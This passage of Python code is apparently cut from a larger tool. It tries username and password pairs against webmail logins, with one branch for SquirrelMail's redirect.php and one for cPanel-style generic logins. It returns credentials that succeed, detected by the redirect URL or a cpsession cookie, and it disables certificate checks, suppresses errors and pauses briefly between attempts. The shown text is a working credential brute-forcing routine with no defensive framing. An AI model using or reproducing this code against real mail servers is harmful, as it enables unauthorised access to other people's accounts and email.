                    base_url + '/src/redirect.php',
                    data={
                        'login_username':        user,
                        'secretkey':             pwd,
                        'js_autodetect_results': '1',
                        'just_logged_in':        '1',
                    },
                    timeout=timeout, verify=False, allow_redirects=True,
                )
                if 'webmail.php' in r2.url or 'left_main.php' in r2.url:
                    return {'username': user, 'password': pwd}

            elif wm_type == 'generic':
                r2 = sess.post(login_url, data={
                    'user':     user,
                    'pass':     pwd,
                    'goto_uri': '/',
                }, timeout=timeout, verify=False, allow_redirects=True)
                rl2 = r2.url.lower()
                if 'cpsession' in rl2 or '/frontend/' in rl2:
                    return {'username': user, 'password': pwd}
                if any(c.name.startswith('cpsession') for c in sess.cookies):
                    return {'username': user, 'password': pwd}

        except Exception:
            pass
        time.sleep(0.2)

    return None
